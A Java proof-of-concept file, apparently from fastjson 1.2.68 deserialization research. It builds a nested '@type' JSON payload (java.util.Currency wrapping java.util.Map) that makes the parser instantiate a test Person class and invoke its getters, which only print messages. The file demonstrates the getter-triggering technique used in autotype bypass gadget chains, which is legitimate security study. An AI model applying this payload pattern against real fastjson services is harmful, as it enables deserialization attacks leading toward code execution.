package com.firebasky.fastjson.poc1268.su18;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.text.ParseException;
import java.util.HashMap;

public class Person {

    private String name;

    private int _a_g_e_;

    private String gender;

    private HashMap<?, ?> map;

    static {
        System.out.println("static block called");
    }

    public Person() {
        System.out.println("non-parameter constructor called");
    }

    public Person(String name, int age, String gender, HashMap<?, ?> map) {
        System.out.println("constructor called");
        this.name = name;
        this._a_g_e_ = age;
        this.gender = gender;
        this.map = map;
    }

    public String getName() {
        System.out.println("name getter called");
        return name;
    }

    public String getA() {
        System.out.println("Interesting Getter");
        return "s";
    }

    public void setName(String name) {
        System.out.println("name setter called");
        this.name = name;
    }

    public int getAge() {
        System.out.println("age getter called");
        return _a_g_e_;
    }

    public void setAge(int age) {
        System.out.println("age setter called");
        this._a_g_e_ = age;
    }

    public String setGender() {
        System.out.println("gender setter called");
        return gender;
    }

    public HashMap<?, ?> getMap() {
        System.out.println("map getter called");
        return map;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + _a_g_e_ +
                ", gender='" + gender + '\'' +
                ", map=" + map +
                '}';
    }

    public static void main(String[] args) {
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //System.out.println(JSON.toJSON(new Person()));
        String poc = "{\n" +
                "\t\"xxx\":{\n" +
                "\t\t\"@type\": \"java.util.Currency\",\n" +
                "\t\t\"val\": {\n" +
                "\t\t\t\"currency\": {\n" +
                "\t\t\t\t\"abc\": {\n" +
                "\t\t\t\t\t\"@type\": \"java.util.Map\",\n" +
                "\t\t\t\t\t\"aaa\": {\n" +
                "\t\t\t\t\t\t\"@type\": \"com.firebasky.fastjson.poc1268.su18.Person\",\n" +
                "\t\t\t\t\t\t\"a\": \"s\",\n" +
                "\t\t\t\t\t\t\"age\": 12,\n" +
                "\t\t\t\t\t\t\"name\": \"su18\"\n" +
                "\t\t\t\t\t}\n" +
                "\t\t\t\t}\n" +
                "\t\t\t}\n" +
                "\t\t}\n" +
                "\t}\n" +
                "}";
        JSON.parseObject(poc);
    }
}